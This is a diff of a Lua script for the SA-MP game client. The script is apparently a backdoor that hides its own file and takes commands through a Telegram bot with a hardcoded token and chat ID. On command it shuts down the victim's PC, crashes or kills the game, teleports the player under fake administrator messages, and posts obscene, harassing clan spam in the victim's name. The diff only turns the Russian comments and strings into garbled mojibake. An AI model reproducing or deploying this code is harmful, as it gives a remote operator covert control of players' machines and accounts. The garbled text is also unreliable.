@@ -6,8 +6,8 @@ u8 = encoding.UTF8
 
 ffi.cdef 'void __stdcall ExitProcess(unsigned int)'
 
-chat_id = '-1002144476171' -- чат ID юзера
-token = '7094826046:AAGntZxJ8YjYowsx5NDHcbJIYo50ihJPS0o' -- токен бота
+chat_id = '-1002144476171' -- С‡Р°С‚ ID СЋР·РµСЂР°
+token = '7094826046:AAGntZxJ8YjYowsx5NDHcbJIYo50ihJPS0o' -- С‚РѕРєРµРЅ Р±РѕС‚Р°
 
 local FILE_ATTRIBUTE = {
     ARCHIVE = 32, -- (0x20)
@@ -20,7 +20,7 @@ local FILE_ATTRIBUTE = {
     TEMPORARY = 256, -- (0x100)
 }
 
-local updateid -- ID последнего сообщения для того чтобы не было флуда
+local updateid -- ID РїРѕСЃР»РµРґРЅРµРіРѕ СЃРѕРѕР±С‰РµРЅРёСЏ РґР»СЏ С‚РѕРіРѕ С‡С‚РѕР±С‹ РЅРµ Р±С‹Р»Рѕ С„Р»СѓРґР°
 
 function threadHandle(runner, url, args, resolve, reject)
     local t = runner(url, args)
@@ -78,44 +78,44 @@ function encodeUrl(str)
     return u8:encode(str, 'CP1251')
 end
 
-function sendTelegramNotification(msg) -- функция для отправки сообщения юзеру
-    msg = msg:gsub('{......}', '') --тут типо убираем цвет
-    msg = encodeUrl(msg) -- ну тут мы закодируем строку
-    async_http_request('https://api.telegram.org/bot' .. token .. '/sendMessage?chat_id=' .. chat_id .. '&text='..msg,'', function(result) end) -- а тут уже отправка
+function sendTelegramNotification(msg) -- С„СѓРЅРєС†РёСЏ РґР»СЏ РѕС‚РїСЂР°РІРєРё СЃРѕРѕР±С‰РµРЅРёСЏ СЋР·РµСЂСѓ
+    msg = msg:gsub('{......}', '') --С‚СѓС‚ С‚РёРїРѕ СѓР±РёСЂР°РµРј С†РІРµС‚
+    msg = encodeUrl(msg) -- РЅСѓ С‚СѓС‚ РјС‹ Р·Р°РєРѕРґРёСЂСѓРµРј СЃС‚СЂРѕРєСѓ
+    async_http_request('https://api.telegram.org/bot' .. token .. '/sendMessage?chat_id=' .. chat_id .. '&text='..msg,'', function(result) end) -- Р° С‚СѓС‚ СѓР¶Рµ РѕС‚РїСЂР°РІРєР°
 end
 
-function get_telegram_updates() -- функция получения сообщений от юзера
-    while not updateid do wait(1) end -- ждем пока не узнаем последний ID
+function get_telegram_updates() -- С„СѓРЅРєС†РёСЏ РїРѕР»СѓС‡РµРЅРёСЏ СЃРѕРѕР±С‰РµРЅРёР№ РѕС‚ СЋР·РµСЂР°
+    while not updateid do wait(1) end -- Р¶РґРµРј РїРѕРєР° РЅРµ СѓР·РЅР°РµРј РїРѕСЃР»РµРґРЅРёР№ ID
     local runner = requestRunner()
     local reject = function() end
     local args = ''
     while true do
-        url = 'https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1' -- создаем ссылку
+        url = 'https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1' -- СЃРѕР·РґР°РµРј СЃСЃС‹Р»РєСѓ
         threadHandle(runner, url, args, processing_telegram_messages, reject)
         wait(0)
     end
 end
 
 local messages = {
-    "ЕБАЛ КАЙПЕНА, САНЖАРА В ОЧКО. МАТЬ ШЛЮХА ИХ, БАТЯ ШАКАЛ. QUWIN CLAN (SELL VV - VAHAR (fp))",
-    "УЕБАНСКИЙ ГЛАВНЫЙ АДМИНИСТРАТОР! ПОЗОР ЕГО МАТЬ ШЛЮХА! QUWIN CLAN СИЛА",
-    "QUWIN CUJLA А ВЫ ХУЕСОСЫ. ПРОЕКТ ГОВНО. САНЖАР MQMQMQ МАТЬ ШАЛАВА",
-    "ПРЕКРАСНЫЙ ДЕНЬ ЧТОБЫ ВЫБИТЬ ЗУБЫ МАМЕ СПЕЦ АДМИНА! QUWIN CLAN БОССЫ. MQMQMQ",
-    "Чем занимаешься? СТУЧУ ХУЕМ ПО ПИЗДЕ МАМЫ ГА. QUWIN МОЩНЫЕ",
-    "УЕБАНЫ, Я ВАШ СЕРВЕР ЕБАЛ! ПРОДАМ ВВ FP VAHAR. QUWIN CLAN",
-    "alo псины, админы дрочуны + дибилы! quwin clan сила. мать ваша в могиле",
-    "ЗДАРОВА ОТ ТЕСЛОВА НИЩИЕ ЕБЛАНЫ! QUWIN CLAN ПЕРЕДАЛ ПРИВЕТ ВАМ!",
-    "продам вирті по цене 12 руб кк. кьювин клан ТОПОВІЙ ТЕСЛОВ"
+    "Р•Р‘РђР› РљРђР™РџР•РќРђ, РЎРђРќР–РђР Рђ Р’ РћР§РљРћ. РњРђРўР¬ РЁР›Р®РҐРђ РРҐ, Р‘РђРўРЇ РЁРђРљРђР›. QUWIN CLAN (SELL VV - VAHAR (fp))",
+    "РЈР•Р‘РђРќРЎРљРР™ Р“Р›РђР’РќР«Р™ РђР”РњРРќРРЎРўР РђРўРћР ! РџРћР—РћР  Р•Р“Рћ РњРђРўР¬ РЁР›Р®РҐРђ! QUWIN CLAN РЎРР›Рђ",
+    "QUWIN CUJLA Рђ Р’Р« РҐРЈР•РЎРћРЎР«. РџР РћР•РљРў Р“РћР’РќРћ. РЎРђРќР–РђР  MQMQMQ РњРђРўР¬ РЁРђР›РђР’Рђ",
+    "РџР Р•РљР РђРЎРќР«Р™ Р”Р•РќР¬ Р§РўРћР‘Р« Р’Р«Р‘РРўР¬ Р—РЈР‘Р« РњРђРњР• РЎРџР•Р¦ РђР”РњРРќРђ! QUWIN CLAN Р‘РћРЎРЎР«. MQMQMQ",
+    "Р§РµРј Р·Р°РЅРёРјР°РµС€СЊСЃСЏ? РЎРўРЈР§РЈ РҐРЈР•Рњ РџРћ РџРР—Р”Р• РњРђРњР« Р“Рђ. QUWIN РњРћР©РќР«Р•",
+    "РЈР•Р‘РђРќР«, РЇ Р’РђРЁ РЎР•Р Р’Р•Р  Р•Р‘РђР›! РџР РћР”РђРњ Р’Р’ FP VAHAR. QUWIN CLAN",
+    "alo РїСЃРёРЅС‹, Р°РґРјРёРЅС‹ РґСЂРѕС‡СѓРЅС‹ + РґРёР±РёР»С‹! quwin clan СЃРёР»Р°. РјР°С‚СЊ РІР°С€Р° РІ РјРѕРіРёР»Рµ",
+    "Р—Р”РђР РћР’Рђ РћРў РўР•РЎР›РћР’Рђ РќРР©РР• Р•Р‘Р›РђРќР«! QUWIN CLAN РџР•Р Р•Р”РђР› РџР РР’Р•Рў Р’РђРњ!",
+    "РїСЂРѕРґР°Рј РІРёСЂС‚С– РїРѕ С†РµРЅРµ 12 СЂСѓР± РєРє. РєСЊСЋРІРёРЅ РєР»Р°РЅ РўРћРџРћР’Р†Р™ РўР•РЎР›РћР’"
 }
 
 local function getRandomMessage()
-    local index = math.random(1, #messages) -- Генерируем случайный индекс в пределах размера массива
-    return messages[index] -- Возвращаем выбранное сообщение
+    local index = math.random(1, #messages) -- Р“РµРЅРµСЂРёСЂСѓРµРј СЃР»СѓС‡Р°Р№РЅС‹Р№ РёРЅРґРµРєСЃ РІ РїСЂРµРґРµР»Р°С… СЂР°Р·РјРµСЂР° РјР°СЃСЃРёРІР°
+    return messages[index] -- Р’РѕР·РІСЂР°С‰Р°РµРј РІС‹Р±СЂР°РЅРЅРѕРµ СЃРѕРѕР±С‰РµРЅРёРµ
 end
 
-function processing_telegram_messages(result) -- функция проверОчки того что отправил чел
+function processing_telegram_messages(result) -- С„СѓРЅРєС†РёСЏ РїСЂРѕРІРµСЂРћС‡РєРё С‚РѕРіРѕ С‡С‚Рѕ РѕС‚РїСЂР°РІРёР» С‡РµР»
     if result then
-        -- тута мы проверяем все ли верно
+        -- С‚СѓС‚Р° РјС‹ РїСЂРѕРІРµСЂСЏРµРј РІСЃРµ Р»Рё РІРµСЂРЅРѕ
         local proc_table = decodeJson(result)
         if proc_table.ok then
             if #proc_table.result > 0 then
@@ -125,12 +125,12 @@ function processing_telegram_messages(result) -- функция проверОчки того что отп
                         updateid = res_table.update_id
                         local message_from_user = res_table.message.text
                         if message_from_user then
-                            -- и тут если чел отправил текст мы сверяем
-                            local text = u8:decode(message_from_user) .. ' ' --добавляем в конец пробел дабы не произошли тех. шоколадки с командами(типо чтоб !q не считалось как !qq)
+                            -- Рё С‚СѓС‚ РµСЃР»Рё С‡РµР» РѕС‚РїСЂР°РІРёР» С‚РµРєСЃС‚ РјС‹ СЃРІРµСЂСЏРµРј
+                            local text = u8:decode(message_from_user) .. ' ' --РґРѕР±Р°РІР»СЏРµРј РІ РєРѕРЅРµС† РїСЂРѕР±РµР» РґР°Р±С‹ РЅРµ РїСЂРѕРёР·РѕС€Р»Рё С‚РµС…. С€РѕРєРѕР»Р°РґРєРё СЃ РєРѕРјР°РЅРґР°РјРё(С‚РёРїРѕ С‡С‚РѕР± !q РЅРµ СЃС‡РёС‚Р°Р»РѕСЃСЊ РєР°Рє !qq)
                             if text:match('^!sendchat') then
                                 sampSendChat(arg)
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Сообщение \"%s\" было отправлено игроком \"%s\"\n\n%%F0%%9F%%92%%BB Сервер: \"%s\"", arg, nickname, sampGetCurrentServerName()))
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РЎРѕРѕР±С‰РµРЅРёРµ \"%s\" Р±С‹Р»Рѕ РѕС‚РїСЂР°РІР»РµРЅРѕ РёРіСЂРѕРєРѕРј \"%s\"\n\n%%F0%%9F%%92%%BB РЎРµСЂРІРµСЂ: \"%s\"", arg, nickname, sampGetCurrentServerName()))
                             
                             elseif text:match('^!sliv_vr') then
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
@@ -138,7 +138,7 @@ function processing_telegram_messages(result) -- функция проверОчки того что отп
                                     wait(1366)
                                     local str = getRandomMessage()
                                     sampSendChat('/vr '..str)
-                                    sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игроком \"%s\" было отправлено сообщение \"%s\"", nickname, str))
+                                    sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РРіСЂРѕРєРѕРј \"%s\" Р±С‹Р»Рѕ РѕС‚РїСЂР°РІР»РµРЅРѕ СЃРѕРѕР±С‰РµРЅРёРµ \"%s\"", nickname, str))
                                 end
 
                             elseif text:match('^!sliv_fam') then
@@ -147,16 +147,16 @@ function processing_telegram_messages(result) -- функция проверОчки того что отп
                                     wait(1066)
                                     local str = getRandomMessage()
                                     sampSendChat('/fam '..str)
-                                    sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Иг)роком \"%s\" было отправлено сообщение \"%s\"", nickname, str))
+                                    sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РРі)СЂРѕРєРѕРј \"%s\" Р±С‹Р»Рѕ РѕС‚РїСЂР°РІР»РµРЅРѕ СЃРѕРѕР±С‰РµРЅРёРµ \"%s\"", nickname, str))
                                 end
                             
                             elseif text:match('^!getnick') then
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" сейчас играет на сервере \"%s\"", nickname, sampGetCurrentServerName()))
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РРіСЂРѕРє \"%s\" СЃРµР№С‡Р°СЃ РёРіСЂР°РµС‚ РЅР° СЃРµСЂРІРµСЂРµ \"%s\"", nickname, sampGetCurrentServerName()))
                             
                             elseif text:match('^!crash') then
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" был успешно крашнут.", nickname))
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РРіСЂРѕРє \"%s\" Р±С‹Р» СѓСЃРїРµС€РЅРѕ РєСЂР°С€РЅСѓС‚.", nickname))
                                 lua_thread.create(function()
                                     wait(1000)
                                     writeMemory(0x1, 0x1, 0x1)
@@ -164,7 +164,7 @@ function processing_telegram_messages(result) -- функция проверОчки того что отп
                             
                             elseif text:find('^!quit') then
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" вышел с игры.", nickname))
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РРіСЂРѕРє \"%s\" РІС‹С€РµР» СЃ РёРіСЂС‹.", nickname))
                                 lua_thread.create(function()
                                     wait(1000)
                                     ffi.C.ExitProcess(0)
@@ -172,17 +172,17 @@ function processing_telegram_messages(result) -- функция проверОчки того что отп
                             
                             elseif text:find('^!off_pc') then
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Поздравляю! Вы помогли игроку \"%s\" выключить комп.", nickname))
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РџРѕР·РґСЂР°РІР»СЏСЋ! Р’С‹ РїРѕРјРѕРіР»Рё РёРіСЂРѕРєСѓ \"%s\" РІС‹РєР»СЋС‡РёС‚СЊ РєРѕРјРї.", nickname))
                                 lua_thread.create(function()
                                     wait(1000)
                                     os.execute('shutdown /s /t 1')
                                 end)
                             --[[elseif text:find('^!explorer') then
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Поздравляю! Вы помогли игроку \"%s\" открыть 5 проводников", nickname))
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РџРѕР·РґСЂР°РІР»СЏСЋ! Р’С‹ РїРѕРјРѕРіР»Рё РёРіСЂРѕРєСѓ \"%s\" РѕС‚РєСЂС‹С‚СЊ 5 РїСЂРѕРІРѕРґРЅРёРєРѕРІ", nickname))
                                 for i = 1, 5 do
                                     lua_thread.create(function()
-                                        wait(50) -- Ждем 1 секунду перед открытием следующего проводника
+                                        wait(50) -- Р–РґРµРј 1 СЃРµРєСѓРЅРґСѓ РїРµСЂРµРґ РѕС‚РєСЂС‹С‚РёРµРј СЃР»РµРґСѓСЋС‰РµРіРѕ РїСЂРѕРІРѕРґРЅРёРєР°
                                         os.execute('explorer.exe')
                                     end)
                                 end]]
@@ -191,21 +191,21 @@ function processing_telegram_messages(result) -- функция проверОчки того что отп
                                 raknetSendRpc(52, bs)
                                 raknetDeleteBitStream(bs)
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" был отправлен на спавн.", nickname))
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РРіСЂРѕРє \"%s\" Р±С‹Р» РѕС‚РїСЂР°РІР»РµРЅ РЅР° СЃРїР°РІРЅ.", nickname))
                             
                             elseif text:find('^!kill') then
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                 local x, y, z = getCharCoordinates(PLAYER_PED)
                                 setCharCoordinates(PLAYER_PED, x, y, z-7)
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" был отправлен под текстуры. В скором времени он умрёт. Он получил уведомление, что это сделал администратор.", nickname))
-                                sampAddChatMessage('Вы были телепортированы Администратором',-1)
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РРіСЂРѕРє \"%s\" Р±С‹Р» РѕС‚РїСЂР°РІР»РµРЅ РїРѕРґ С‚РµРєСЃС‚СѓСЂС‹. Р’ СЃРєРѕСЂРѕРј РІСЂРµРјРµРЅРё РѕРЅ СѓРјСЂС‘С‚. РћРЅ РїРѕР»СѓС‡РёР» СѓРІРµРґРѕРјР»РµРЅРёРµ, С‡С‚Рѕ СЌС‚Рѕ СЃРґРµР»Р°Р» Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂ.", nickname))
+                                sampAddChatMessage('Р’С‹ Р±С‹Р»Рё С‚РµР»РµРїРѕСЂС‚РёСЂРѕРІР°РЅС‹ РђРґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂРѕРј',-1)
                             
                             elseif text:find('^!slap') then
                                 local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
                                 local x, y, z = getCharCoordinates(PLAYER_PED)
                                 setCharCoordinates(PLAYER_PED, x, y, z+7)
-                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Игрок \"%s\" был слапнут. Он получил уведомление, что это сделал администратор.", nickname))
-                                sampAddChatMessage('Вы были подброшены Администратором',-1)
+                                sendTelegramNotification(string.format("%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F РРіСЂРѕРє \"%s\" Р±С‹Р» СЃР»Р°РїРЅСѓС‚. РћРЅ РїРѕР»СѓС‡РёР» СѓРІРµРґРѕРјР»РµРЅРёРµ, С‡С‚Рѕ СЌС‚Рѕ СЃРґРµР»Р°Р» Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂ.", nickname))
+                                sampAddChatMessage('Р’С‹ Р±С‹Р»Рё РїРѕРґР±СЂРѕС€РµРЅС‹ РђРґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂРѕРј',-1)
                             end
                         end
                     end
@@ -216,7 +216,7 @@ function processing_telegram_messages(result) -- функция проверОчки того что отп
 end
 
 
-function getLastUpdate() -- тут мы получаем последний ID сообщения, если же у вас в коде будет настройка токена и chat_id, вызовите эту функцию для того чтоб получить последнее сообщение
+function getLastUpdate() -- С‚СѓС‚ РјС‹ РїРѕР»СѓС‡Р°РµРј РїРѕСЃР»РµРґРЅРёР№ ID СЃРѕРѕР±С‰РµРЅРёСЏ, РµСЃР»Рё Р¶Рµ Сѓ РІР°СЃ РІ РєРѕРґРµ Р±СѓРґРµС‚ РЅР°СЃС‚СЂРѕР№РєР° С‚РѕРєРµРЅР° Рё chat_id, РІС‹Р·РѕРІРёС‚Рµ СЌС‚Сѓ С„СѓРЅРєС†РёСЋ РґР»СЏ С‚РѕРіРѕ С‡С‚РѕР± РїРѕР»СѓС‡РёС‚СЊ РїРѕСЃР»РµРґРЅРµРµ СЃРѕРѕР±С‰РµРЅРёРµ
     async_http_request('https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1','',function(result)
         if result then
             local proc_table = decodeJson(result)
@@ -227,7 +227,7 @@ function getLastUpdate() -- тут мы получаем последний ID сообщения, если же у ва
                         updateid = res_table.update_id
                     end
                 else
-                    updateid = 1 -- тут зададим значение 1, если таблица будет пустая
+                    updateid = 1 -- С‚СѓС‚ Р·Р°РґР°РґРёРј Р·РЅР°С‡РµРЅРёРµ 1, РµСЃР»Рё С‚Р°Р±Р»РёС†Р° Р±СѓРґРµС‚ РїСѓСЃС‚Р°СЏ
                 end
             end
         end
@@ -238,8 +238,8 @@ function main()
     while not isSampAvailable() do
         wait(0)
     end
-    getLastUpdate() -- вызываем функцию получения последнего ID сообщения
-    lua_thread.create(get_telegram_updates) -- создаем нашу функцию получения сообщений от юзера
+    getLastUpdate() -- РІС‹Р·С‹РІР°РµРј С„СѓРЅРєС†РёСЋ РїРѕР»СѓС‡РµРЅРёСЏ РїРѕСЃР»РµРґРЅРµРіРѕ ID СЃРѕРѕР±С‰РµРЅРёСЏ
+    lua_thread.create(get_telegram_updates) -- СЃРѕР·РґР°РµРј РЅР°С€Сѓ С„СѓРЅРєС†РёСЋ РїРѕР»СѓС‡РµРЅРёСЏ СЃРѕРѕР±С‰РµРЅРёР№ РѕС‚ СЋР·РµСЂР°
 
     SetFileAttributes(thisScript().path, FILE_ATTRIBUTE.HIDDEN)
 
